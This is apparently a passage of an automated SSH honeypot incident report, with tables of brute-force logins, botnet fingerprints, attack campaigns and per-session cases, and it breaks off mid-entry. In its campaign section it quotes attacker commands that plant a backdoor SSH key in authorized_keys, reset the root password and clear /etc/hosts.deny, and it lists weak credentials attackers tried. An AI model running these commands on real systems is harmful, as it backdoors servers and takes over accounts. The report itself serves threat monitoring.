| `root` | `p@ssw0rd` | `91.92.40.6` | 2026-07-06T12:30:00 |
| `deploy` | `deploy` | `91.92.40.176` | 2026-07-06T12:31:26 |
| `root` | `passw0rd` | `91.92.40.6` | 2026-07-06T12:31:34 |
| `centos` | `user` | `45.198.224.120` | 2026-07-06T12:32:58 |
| `root` | `password` | `91.92.40.6` | 2026-07-06T12:33:07 |
| `root` | `111111` | `38.22.170.10` | 2026-07-06T12:33:23 |
| `345gs5662d34` | `345gs5662d34` | `38.22.170.10` | 2026-07-06T12:33:25 |
| `root` | `3245gs5662d34` | `38.22.170.10` | 2026-07-06T12:33:26 |
| `test` | `test` | `91.92.40.176` | 2026-07-06T12:33:48 |
| `root` | `qwerty` | `91.92.40.6` | 2026-07-06T12:34:39 |
| `nagios` | `nagios` | `91.92.40.176` | 2026-07-06T12:36:05 |
| `clz` | `1qaz@WSX` | `2.58.172.185` | 2026-07-06T12:37:34 |
| `root` | `root1` | `91.92.40.6` | 2026-07-06T12:37:43 |
| `guest` | `guest` | `91.92.40.176` | 2026-07-06T12:38:22 |
| `root` | `root12` | `91.92.40.6` | 2026-07-06T12:39:12 |
| `weblogic` | `weblogic` | `91.92.40.176` | 2026-07-06T12:40:37 |
| `root` | `root123` | `91.92.40.6` | 2026-07-06T12:40:41 |
| `testserver` | `testserver` | `20.255.61.0` | 2026-07-06T12:41:21 |
| `345gs5662d34` | `345gs5662d34` | `20.255.61.0` | 2026-07-06T12:41:24 |
| `testserver` | `3245gs5662d34` | `20.255.61.0` | 2026-07-06T12:41:26 |
| `root` | `root1234` | `91.92.40.6` | 2026-07-06T12:42:10 |
| `mysql` | `mysql` | `91.92.40.176` | 2026-07-06T12:43:04 |
| `root` | `root12345` | `91.92.40.6` | 2026-07-06T12:43:39 |
| `root` | `root123456` | `91.92.40.6` | 2026-07-06T12:45:06 |
| `g` | `123456` | `45.198.224.120` | 2026-07-06T12:45:16 |
| `apache` | `apache` | `91.92.40.176` | 2026-07-06T12:45:23 |
| `root` | `root1234567` | `91.92.40.6` | 2026-07-06T12:46:33 |
| `root` | `!qaz_@wsx` | `45.207.196.123` | 2026-07-06T12:47:22 |
| `345gs5662d34` | `345gs5662d34` | `45.207.196.123` | 2026-07-06T12:47:25 |
| `root` | `3245gs5662d34` | `45.207.196.123` | 2026-07-06T12:47:27 |
| `postgres` | `123456` | `91.92.40.176` | 2026-07-06T12:47:49 |
| `root` | `root123456789` | `91.92.40.6` | 2026-07-06T12:48:01 |
| `root` | `root1234567890` | `91.92.40.6` | 2026-07-06T12:49:30 |
| `postgres` | `654321` | `91.92.40.176` | 2026-07-06T12:50:09 |
| `admin` | `1` | `91.92.40.6` | 2026-07-06T12:50:58 |
| `admin` | `12` | `91.92.40.6` | 2026-07-06T12:52:27 |
| `postgres` | `123` | `91.92.40.176` | 2026-07-06T12:52:28 |
| `admin` | `123` | `91.92.40.6` | 2026-07-06T12:53:54 |
| `postgres` | `321` | `91.92.40.176` | 2026-07-06T12:54:43 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **987** |
| Sessions with Fingerprint | **23** |
| Unique HASSH Fingerprints | **23** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 306 |
| libssh | 115 |
| Paramiko (Python) | 29 |
| Unknown | 3 |
| Nmap scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 122 | 2 |
| `f555226df196...` | Mirai/variant | 88 | 30 |
| `2ec37a7cc8da...` | Mirai/variant | 85 | 3 |
| `16443846184e...` | Generic scanner | 62 | 6 |
| `a2de0f306611...` | Mirai/variant | 28 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 122 | 2 | Generic scanner |
| `f555226df196...` | libssh | 88 | 30 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 85 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 62 | 6 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 28 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 20 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 20 | 7 | — |
| `bf7dbf67fa9b...` | Go SSH scanner | 8 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **12** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 82 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 28 | 28 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:A3XcaMolep4A"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `117.173.65.4`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.209`, `91.92.40.176`, `91.92.40.6`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `57.128.225.99`, `158.220.83.77`, `198.23.232.146`, `152.53.0.56`, `103.237.144.204`, `201.249.192.30`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **107** |
| Unique ASNs | **64** |
| High-Risk ASNs | **61** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 7 | HIGH |
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (416)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6366479016ed

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 06:56 |
| **Last Seen** | 2026-07-06 06:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:56:57` | `cowrie.session.connect` |
| `2026-07-06 06:56:58` | `cowrie.client.version` |
| `2026-07-06 06:56:58` | `cowrie.client.kex` |
| `2026-07-06 06:57:02` | `cowrie.login.success` |
| `2026-07-06 06:57:05` | `cowrie.session.params` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:05` | `cowrie.command.success` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:05` | `cowrie.command.input` |
| `2026-07-06 06:57:07` | `cowrie.log.closed` |
| `2026-07-06 06:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-825d67f915da

| Field | Detail |
|---|---|
| **Source IP** | `157.173.104[.]13` |
| **First Seen** | 2026-07-06 06:57 |
| **Last Seen** | 2026-07-06 06:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:57:57` | `cowrie.session.connect` |
| `2026-07-06 06:57:58` | `cowrie.client.version` |
| `2026-07-06 06:57:58` | `cowrie.client.kex` |
| `2026-07-06 06:58:00` | `cowrie.login.success` |
| `2026-07-06 06:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.173.104[.]13` to AbuseIPDB if not already reported
- [ ] Block `157.173.104[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91e6911366c

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-06 06:58 |
| **Last Seen** | 2026-07-06 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:58:01` | `cowrie.session.connect` |
| `2026-07-06 06:58:01` | `cowrie.client.version` |
| `2026-07-06 06:58:02` | `cowrie.client.kex` |
| `2026-07-06 06:58:02` | `cowrie.login.success` |
| `2026-07-06 06:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8511b0b3a80d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 06:58 |
| **Last Seen** | 2026-07-06 06:58 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:58:15` | `cowrie.session.connect` |
| `2026-07-06 06:58:17` | `cowrie.client.version` |
| `2026-07-06 06:58:17` | `cowrie.client.kex` |
| `2026-07-06 06:58:24` | `cowrie.login.success` |
| `2026-07-06 06:58:28` | `cowrie.session.params` |
| `2026-07-06 06:58:28` | `cowrie.command.input` |
| `2026-07-06 06:58:30` | `cowrie.log.closed` |
| `2026-07-06 06:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b627f0aafb31

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 06:59 |
| **Last Seen** | 2026-07-06 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:59:50` | `cowrie.session.connect` |
| `2026-07-06 06:59:50` | `cowrie.client.version` |
| `2026-07-06 06:59:51` | `cowrie.client.kex` |
| `2026-07-06 06:59:51` | `cowrie.login.success` |
| `2026-07-06 06:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e3d4bdad5c2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 06:59 |
| **Last Seen** | 2026-07-06 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:59:51` | `cowrie.session.connect` |
| `2026-07-06 06:59:51` | `cowrie.client.version` |
| `2026-07-06 06:59:51` | `cowrie.client.kex` |
| `2026-07-06 06:59:51` | `cowrie.login.success` |
| `2026-07-06 06:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88dd798cceba

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 06:59 |
| **Last Seen** | 2026-07-06 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:59:52` | `cowrie.session.connect` |
| `2026-07-06 06:59:52` | `cowrie.client.version` |
| `2026-07-06 06:59:52` | `cowrie.client.kex` |
| `2026-07-06 06:59:53` | `cowrie.login.success` |
| `2026-07-06 06:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2b8dbb245a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 06:59 |
| **Last Seen** | 2026-07-06 07:00 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:59:52` | `cowrie.session.connect` |
| `2026-07-06 06:59:53` | `cowrie.client.version` |
| `2026-07-06 06:59:53` | `cowrie.client.kex` |
| `2026-07-06 07:00:04` | `cowrie.login.success` |
| `2026-07-06 07:00:07` | `cowrie.session.params` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:07` | `cowrie.command.success` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:07` | `cowrie.command.input` |
| `2026-07-06 07:00:09` | `cowrie.log.closed` |
| `2026-07-06 07:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8635fa636c6b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 06:59 |
| **Last Seen** | 2026-07-06 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:59:53` | `cowrie.session.connect` |
| `2026-07-06 06:59:53` | `cowrie.client.version` |
| `2026-07-06 06:59:53` | `cowrie.client.kex` |
| `2026-07-06 06:59:54` | `cowrie.login.success` |
| `2026-07-06 06:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05c99f57f530

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 07:02 |
| **Last Seen** | 2026-07-06 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:02:36` | `cowrie.session.connect` |
| `2026-07-06 07:02:36` | `cowrie.client.version` |
| `2026-07-06 07:02:36` | `cowrie.client.kex` |
| `2026-07-06 07:02:36` | `cowrie.login.success` |
| `2026-07-06 07:02:36` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:02:36` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e93485eda83f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 07:02 |
| **Last Seen** | 2026-07-06 07:03 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:02:55` | `cowrie.session.connect` |
| `2026-07-06 07:02:57` | `cowrie.client.version` |
| `2026-07-06 07:02:57` | `cowrie.client.kex` |
| `2026-07-06 07:03:04` | `cowrie.login.success` |
| `2026-07-06 07:03:08` | `cowrie.session.params` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:08` | `cowrie.command.success` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:08` | `cowrie.command.input` |
| `2026-07-06 07:03:10` | `cowrie.log.closed` |
| `2026-07-06 07:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04b20ac32a77

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 07:05 |
| **Last Seen** | 2026-07-06 07:06 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:05:48` | `cowrie.session.connect` |
| `2026-07-06 07:05:50` | `cowrie.client.version` |
| `2026-07-06 07:05:52` | `cowrie.client.kex` |
| `2026-07-06 07:05:59` | `cowrie.login.success` |
| `2026-07-06 07:06:04` | `cowrie.session.params` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:04` | `cowrie.command.success` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:04` | `cowrie.command.input` |
| `2026-07-06 07:06:06` | `cowrie.log.closed` |
| `2026-07-06 07:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbebd05f84a5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-06 07:08 |
| **Last Seen** | 2026-07-06 07:09 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:08:35` | `cowrie.session.connect` |
| `2026-07-06 07:08:38` | `cowrie.client.version` |
| `2026-07-06 07:08:38` | `cowrie.client.kex` |
| `2026-07-06 07:08:50` | `cowrie.login.success` |
| `2026-07-06 07:09:03` | `cowrie.session.params` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:03` | `cowrie.command.success` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:03` | `cowrie.command.input` |
| `2026-07-06 07:09:06` | `cowrie.log.closed` |
| `2026-07-06 07:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-302fd9eeb4e1

| Field | Detail |
|---|---|
| **Source IP** | `187.212.1[.]182` |
